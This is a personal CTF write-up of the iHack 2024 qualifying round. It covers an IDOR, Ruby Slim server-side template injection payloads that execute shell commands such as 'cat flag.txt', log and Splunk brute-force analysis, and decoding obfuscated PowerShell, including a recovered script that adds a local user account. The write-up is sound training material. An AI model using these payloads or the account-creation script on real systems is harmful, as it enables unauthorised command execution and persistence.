---
title: Ihack 2024 Qualifying Round-Online (27-28 July 2024)(24hours)
description: iHack2024 - Writeup (Sentinels)
date: 2024-08-1 00:34:00 +0800
categories: [Writeup, ihack]
tags: [Craft CMS]
image: https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/ihack2024-0.jpeg?raw=true
---

Hi, from 27th to 28th August, I participated in the ihack2024 competition which was held online. This CTF consists of 3 stages:

- Stage 1 – Qualifying Round: Jeopardy 27 - 28 July 2024 (Online) (TOP 30 teams)
- Stage 2 - Attack & Defence: 6 - 7 August 2024 (Kuala Lumpur Convention Centre) (TOP 10 teams)
- Grand Finale: Time Attack: 8 August 2024 (Kuala Lumpur Convention Centre) - ICS/SCADA ATTACK

As we know, to move on to the next stage, I need to be in the top 30. I will try my best to compete among 100+ teams so that I can advance to the next stage and gain experience in playing Attack and Defense there. Throughout my participation in CTFs, I have never played an Attack and Defense CTF, so this is the best opportunity. By the way, this time I joined the CTF solo because, hahaha, I don't have friends who want to commit to this CTF.

## Web Security Challenges

### Character Journey

- After registering, log in with valid credentials.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20234335.png?raw=true)

- After that, navigate to home.php and access the `My Account` section.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20234345.png?raw=true)

- From here, we can see that the URL displays a parameter `userid` followed by a number. Try changing this parameter to another value.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20234354.png?raw=true)

- After changing the `userid` parameter to another value, it displays another profile section. This indicates that the website has an IDOR (Insecure Direct Object Reference) vulnerability.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20234408.png?raw=true)

- Try changing the `id` parameter one by one until you find that the parameter `id` with user id 53 contains a flag.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20234431.png?raw=true)

### Simple Pimple Shop

- After accessing the webpage, use the Wappalyzer extension to gather some information. It shows that Ruby is used as the programming language.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20234537.png?raw=true)

- After testing various vulnerabilities such as XSS, I discovered that the site is vulnerable to SSTI because it uses Ruby (Slim). I tried injecting various payloads in the comment section, but nothing happened initially. To test further, I injected `{ 7 * 7 }` to observe the web application's response.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-28%20083258.png?raw=true)

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20234616.png?raw=true)

- After considerable thought, I realized I needed to bypass the filter. After searching for alternative payloads, I found one that worked. By using the payload #{7*7}, the web application responded with '49'. This confirms that the web page is vulnerable to SSTI (Server-Side Template Injection) using Slim (Ruby).

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-28%20083631.png?raw=true)

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20234814.png?raw=true)

- Now it's time to find the flag. Use the payload `#{ %x|env| }` in the comment section and observe the response.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20234721.png?raw=true)

- Change the payload to `#{ %x|ls| }` to display the list of contents and locate the `flag.txt` file.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20234736.png?raw=true)

- Use the payload `#{ %x|cat flag.txt| }` to read the contents of the flag.txt file

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20234803.png?raw=true)


##  Incident Handling Challenge Category

### SSH Compromised

- After extracting the file, it contains a log file with details of an SSH brute-force attack.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20235006.png?raw=true)

- Searching through the log file, I found a successful brute-force attempt: the password for `sysadmin` was accepted from IP address `169.102.244.68`.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-27%20235028.png?raw=true)

##  Malware Analysis 

### Just a normal Exe

- After unzipping the file, it yields a file named `normal.exe`. 

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-28%20085021.png?raw=true)

- Open the `normal.exe` file using the `strings` command.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-28%20085058.png?raw=true)

- This PowerShell script appears to be obfuscated. Decode the URL:

```terminal
$hOeqR = -join (-join ([char[]](104, 116, 116, 112, 58, 47, 47, 49, 53, 57, 46, 50, 50, 51, 46, 
52, 51, 46, 52, 53, 47, 115, 51, 99, 114, 51, 116, 53, 46, 116, 120, 116))).ToCharArray()[-1..-
(-join ([char[]](104, 116, 116, 112, 58, 47, 47, 49, 53, 57, 46, 50, 50, 51, 46, 52, 51, 46, 52, 
53, 47, 115, 51, 99, 114, 51, 116, 53, 46, 116, 120, 116))).Length]
```
The PowerShell script is obfuscated and is constructing a URL. Let's decode it step by step.

- The script creates a URL by converting arrays of ASCII values into characters and then joining them together. The script uses PowerShell's `-join` operator to join characters into strings. Here is a simplified breakdown:

```powershell
$urlPart1 = -join ([char[]](104, 116, 116, 112, 58, 47, 47, 49, 53, 57, 46, 50, 50, 51, 46, 52, 51, 46, 52, 53, 47, 115, 51, 99, 114, 51, 116, 53, 46, 116, 120, 116))
$urlPart2 = $urlPart1.ToCharArray()[-1..-(-join ([char[]](104, 116, 116, 112, 58, 47, 47, 49, 53, 57, 46, 50, 50, 51, 46, 52, 51, 46, 52, 53, 47, 115, 51, 99, 114, 51, 116, 53, 46, 116, 120, 116))).Length]
```

- Both `$urlPart1` and `$urlPart2` are generated from the same ASCII values but with different operations applied to them.

- The ASCII values `[104, 116, 116, 112, 58, 47, 47, 49, 53, 57, 46, 50, 50, 51, 46, 52, 51, 46, 52, 53, 47, 115, 51, 99, 114, 51, 116, 53, 46, 116, 120, 116]` convert to the string `http://159.223.43.45/s3cr3t5.txt`.

- Decoded URL:

```terminal
http://159.223.43.45/s3cr3t5.txt
```
- Access the ip and get a flag

`ihack24{obFusCat!on_Alw4ys_w0rK}`

##  Digital Forensic & Incident Response

### Memory

- After extracting the file, it revealed two additional files. It give a memory dump file. To analyze a `.vmem` file, we can use tools such as volatility or rekall.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-28%20085738.png?raw=true)

- Analyze a memory file using volatility3 and `pstree` or `cmdline` plugins.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-28%20091615.png?raw=true)

- It contains command and PowerShell execution traces. I discovered base64-encoded data within the output

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/352783209-e500f8fe-b801-4e01-91d9-a6a0805137a9.png?raw=true)

```terminal
JABsAGEASQBJAE0AcQAgAD0AIAAnAGQAZAAnACAAKwAgACcAYQAvACcAIAArACAAJwAgAG4AaQAnACAAKwAgACcA
bQBkAEEAUwAnACAAKwAgACcAWQBTACAAbgAnACAAKwAgACcAaQAnACAAKwAgACcAbQBkACcAIAArACAAJwBhAH
MAeQBzACAAJwAgACsAIAAnAHIAJwAgACsAIAAnAGUAcwAnACAAKwAgACcAdQAgAHQAJwAgACsAIAAnAGUAbgAnADs
AIAAkAGsAUwBtAG0AQQBpAHcAIAA9ACAALQBqAG8AaQBuACAAKAAkAGwAYQBJAEkATQBxAC4AVABvAEMAaABhAHI
AQQByAHIAYQB5ACgAKQBbAC0AMQAuAC4ALQAoACQAbABhAEkASQBNAHEALgBMAGUAbgBnAHQAaAApAF0AKQA7A
CAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABrAFMAbQBtAEEAaQB3ACAAOwAgAFMAdABh
AHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADYAMAAwAA==
```

- Decode the base64 encoded

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-28%20093115.png?raw=true)

- Reverse that string using powershell

```powershell
$laIIMq = 'dd' + 'a/' + ' ni' + 'mdAS' + 'YS n' + 'i' + 'md' + 'asys ' + 'r' + 'es' + 'u t' + 'en'; 
$kSmmAiw = -join ($laIIMq.ToCharArray()[-1..-($laIIMq.Length)]); Invoke-Expression 
$kSmmAiw ; Start-Sleep -Seconds 600
```
![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/Screenshot%202024-07-28%20093324.png?raw=true)

ihack{created user_created password} . `ihack{sysadmin_SYSAdmin}`

### Splunk 1

- To begin, I examined the login timeline in /var/log/auth.log, aiming to identify successful 
public IP logins. Unfortunately, this approach did not yield the desired results. Therefore, I 
transitioned to our Splunk server to filter security logs for event codes 4624 (successful login) 
and 4625 (failed login).

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/WhatsApp%20Image%202024-07-28%20at%2009.05.49_0ba84e70.jpg?raw=true)

- During my analysis, I noticed that the brute force attack started occurring around 9:55 and 
continued thereafter. However, security logs for event code 4624 did not show any successful 
logins near this time frame, despite the ongoing brute force attempts. This discrepancy left 
me puzzled.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/WhatsApp%20Image%202024-07-28%20at%2009.05.49_3a8695c5.jpg?raw=true)

- To gain further insights, I switched to filtering Sysmon logs. Unfortunately, this did not 
provide additional clarity, and I remained at an impasse.

- Recognizing the attack was targeting the RDP port 3389, I focused my efforts on 
examining logs specific to 3389 access attempts. By analyzing these logs, I was able to 
identify the first IP address from the destination IPs involved in the brute force attempts. This 
IP was determined to be the attacker's IP

# Result for Stage 

Alhamdulillah. I have advanced to the next stage, the semifinals, which will be held at KLCC. I hope to perform my best in Stage 2 to secure a place in the finals.

![Logo](https://github.com/AmirulMohdNoor/AmirulMohdNoor.github.io/blob/main/images/ihack24/WhatsApp%20Image%202024-08-02%20at%2013.35.56_fe8705c5.jpg?raw=true)
